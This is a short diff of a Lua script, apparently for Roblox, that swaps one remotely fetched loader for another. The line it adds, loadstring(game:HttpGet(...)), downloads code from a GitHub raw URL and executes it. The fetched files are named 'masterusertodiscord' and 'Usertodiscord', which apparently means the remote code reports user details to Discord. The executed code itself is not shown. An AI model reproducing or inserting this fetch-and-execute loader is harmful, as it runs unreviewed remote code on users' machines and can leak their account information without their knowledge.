@@ -138,5 +138,6 @@ else
     end
 end
 
-wait(0.2)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/yClematiS/Main_Loader/main/masterusertodiscord"))()
+task.spawn(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/yClematiS/Main_Loader/main/Usertodiscord"))()
+end)
